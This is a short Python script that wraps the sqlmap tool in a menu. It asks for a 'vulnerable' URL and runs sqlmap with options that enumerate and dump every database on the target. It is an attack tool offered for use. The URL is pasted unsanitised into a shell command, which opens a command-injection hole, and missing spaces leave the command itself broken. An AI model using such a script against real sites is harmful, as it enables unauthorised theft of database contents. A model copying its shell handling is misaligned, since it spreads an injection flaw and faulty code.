import os
import subprocess

url=""


def welcome():
    os.system('clear')
    print("***************SQLmap Automated ***********************")
    print("""
      1) Fetch Url & Start
      0) Exit

      """)
    p=input("Select any option:")
    if p=="1":

           url = input("Input Vulnerable Url: (eg: https://ssy.org/detail.php?id=1 )")
           subprocess.call('sqlmap -u' + url + '--dbs --dump-all', shell=True)
           input("Press any key to go back")
           welcome()

    if p=="0":
     exit()
    else:
     welcome()
welcome()